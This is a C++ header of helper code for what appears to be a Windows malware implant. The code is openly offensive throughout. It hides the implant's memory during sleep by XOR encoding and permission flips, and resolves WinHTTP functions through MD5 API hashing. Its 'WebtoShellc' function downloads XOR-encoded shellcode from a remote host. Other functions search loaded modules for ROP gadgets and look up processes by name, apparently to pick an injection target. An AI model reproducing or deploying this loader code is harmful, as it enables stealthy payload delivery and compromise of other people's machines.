#pragma once
#include <Windows.h>
#include <vector>
#include <string>
#include <tlhelp32.h>
#include <tchar.h>
#include <winhttp.h>
#include <iostream>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
std::vector<BYTE> sc;

void SleepyTime(int seconds) {
    std::string command = "ping 127.0.0.1 -n 12";
    system(command.c_str());
}

BOOL SleepySwitch(int sleep_time, PVOID& mem_region, size_t mem_size) {
    PBYTE mem_backup = new BYTE[mem_size];

    printf("[+] Setting memory permissions to RW\n");
    DWORD oldprot = 0;
    VirtualProtect(mem_region, mem_size, PAGE_READWRITE, &oldprot);

    printf("[+] X0Ring and copying data to backup.\n");
    PBYTE PBytes = (PBYTE)mem_region;
    for (size_t i = 0; i < mem_size; i++) {
        PBytes[i] ^= 0xaa;
    }
    memcpy(mem_backup, mem_region, mem_size);

    printf("[+] Restoring original DLL.\n");
    memcpy(mem_region, mem_backup, mem_size);

    printf("[+] Going to sleep now, goodnight!\n");
    HANDLE sleepythread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)SleepyTime, &sleep_time, NULL, nullptr);
    WaitForSingleObject(sleepythread, INFINITE);

    printf("[+] Waking up, restoring implant in memory\n");
    memcpy(mem_region, mem_backup, mem_size);

    printf("[+] X0Ring back..\n");
    PBytes = (PBYTE)mem_region;
    for (size_t i = 0; i < mem_size; i++) {
        PBytes[i] ^= 0xaa;
    }

    printf("[+] Setting memory back to RWX\n");
    VirtualProtect(mem_region, mem_size, PAGE_EXECUTE_READWRITE, &oldprot);

    return true;
}

auto hashMD5(const std::string& apiName) -> DWORD {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[16];
    DWORD hashSize = 16;
    DWORD result = 0;

    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
            if (CryptHashData(hHash, (const BYTE*)apiName.c_str(), apiName.length(), 0)) {
                if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0)) {
                    result = *(DWORD*)hash;
                }
            }
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    return result;
}

auto FuncToHash(DWORD funchash, const char* libraryname) -> FARPROC {
    LoadLibraryA(libraryname);
    HMODULE module_handle = GetModuleHandleA(libraryname);
    if (!module_handle) {
        printf("[-] LoadModule Failed.");
        return nullptr;
    }
    auto* dosHeader = (IMAGE_DOS_HEADER*)module_handle;
    auto* ntheaders = (IMAGE_NT_HEADERS*)((BYTE*)module_handle + dosHeader->e_lfanew);
    auto* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module_handle +
        ntheaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    auto* nameArray = (DWORD*)((BYTE*)module_handle + exportDir->AddressOfNames);
    auto* funcArray = (DWORD*)((BYTE*)module_handle + exportDir->AddressOfFunctions);
    auto* ordArray = (WORD*)((BYTE*)module_handle + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* funcName = (char*)((BYTE*)module_handle + nameArray[i]);
        if (hashMD5(funcName) == funchash) {
            WORD ordinal = ordArray[i];
            auto* funcAddr = (FARPROC)((BYTE*)module_handle + funcArray[ordinal]);
            printf("Func: %s\n\t\\____Hash: %ul\n\t\t\\____Address: 0x%p\n", funcName, hashMD5(funcName), funcAddr);
            return funcAddr;
        }
    }
    return nullptr;
}

std::vector<BYTE> WebtoShellc(LPCWSTR host, int port, LPCWSTR path) {
    std::vector<BYTE> response;

    auto funcAddr = FuncToHash(3125477765l, "winhttp.dll");
    auto WebOpen = (HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))funcAddr;

    HINTERNET hSession = WebOpen(L"Mozilla", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) {
        std::cerr << "WinHttpOpen call failed.\n";
        return response;
    }

    funcAddr = FuncToHash(1288296109l, "winhttp.dll");
    auto WebConnect = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD))funcAddr;

    HINTERNET hConnect = WebConnect(hSession, host, port, 0);
    if (!hConnect) {
        std::cerr << "WebConnect call failed.\n";
        return response;
    }

    funcAddr = FuncToHash(1597791751l, "winhttp.dll");
    auto WebOpenRequest = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD))funcAddr;

    HINTERNET hRequest = WebOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, 0);
    if (!hRequest) {
        std::cerr << "WinHttpOpenRequest call failed.\n";
        return response;
    }

    funcAddr = FuncToHash(2229927812l, "winhttp.dll");
    auto WebSendRequest = (BOOL(WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR))funcAddr;

    BOOL requestSent = WebSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!requestSent) {
        std::cerr << "WinHttpSendRequest call failed.\n";
        printf("%d", GetLastError());
        return response;
    }

    funcAddr = FuncToHash(709944652l, "winhttp.dll");
    auto GetWebResponse = (BOOL(WINAPI*)(HINTERNET, LPVOID))funcAddr;
    BOOL responserecieved = GetWebResponse(hRequest, NULL);

    funcAddr = FuncToHash(1692893584l, "winhttp.dll");
    auto WebReadData = (BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD))funcAddr;

    DWORD bytesAvailable = 0;
    funcAddr = FuncToHash(3178803667l, "winhttp.dll");
    auto CheckWebDataAvailable = (BOOL(WINAPI*)(HINTERNET, LPDWORD))funcAddr;

    while (CheckWebDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        std::vector<BYTE> buffer(bytesAvailable);
        DWORD bytesRead = 0;

        if (WebReadData(hRequest, buffer.data(), bytesAvailable, &bytesRead)) {
            for (size_t i = 0; i < bytesRead; ++i) {
                buffer[i] ^= 0xaa;
            }
            response.insert(response.end(), buffer.begin(), buffer.begin() + bytesRead);
        }
    }

    return response;
}

std::vector<LPVOID> GadgetFinder(const CHAR* moduleName, BYTE* gadget, size_t gadget_size) {
    std::vector<LPVOID> foundaddresses;
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (hModule == NULL)
        return {};

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    PBYTE starting_address = (PBYTE)hModule;
    DWORD textsectionsize = pSectionHeader->Misc.VirtualSize;

    for (DWORD i = 0; i < textsectionsize; i++) {
        if (memcmp(starting_address + i, gadget, gadget_size) == 0) {
            foundaddresses.push_back((LPVOID)(starting_address + i));
        }
    }
    FreeLibrary(hModule);
    return foundaddresses;
}

DWORD FindProcessByName(const TCHAR* procName) {
    HANDLE hSnapshot;
    DWORD dwProcId = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_tcsicmp(pe32.szExeFile, procName) == 0) {
                dwProcId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return dwProcId;
}
